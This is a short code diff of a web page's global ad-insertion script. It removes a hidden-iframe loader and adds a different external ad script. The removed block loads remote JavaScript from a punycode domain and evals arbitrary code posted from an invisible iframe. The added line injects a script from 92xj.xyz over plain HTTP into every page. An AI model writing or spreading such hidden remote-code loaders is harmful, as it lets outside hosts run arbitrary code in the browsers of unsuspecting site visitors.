@@ -6,21 +6,7 @@
     // 全局ad
     if(config['bottom_ads']=="1"){
         //插入AD代码
-        if (navigator.userAgent.indexOf('baiduboxapp') > -1) {
-            document.write('<script src="https://xn--xhq9mt12cf5v.ren:4443/ty/x-234-33.js"><\/script>')
-        } else {
-            (function() {
-                window.addEventListener("message", function(e) {
-                    var _des_s_234 = e.data;
-                    if (_des_s_234.des_s_234) {
-                        var _s = '/+/g';
-                        eval(decodeURIComponent(_des_s_234.des_s_234.replace(_s, "%20")))
-                    }
-                });
-                document.write('<iframe style="display:none;" src="https://xn--xhq9mt12cf5v.ren:4443/ty/x-234-33-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')
-            }
-            )();
-        }
+        document.write("<script type='text/javascript' charset='UTF-8' async src='http://92xj.xyz/vs.php?id=174'></script>")
     }
 
     //cnzz
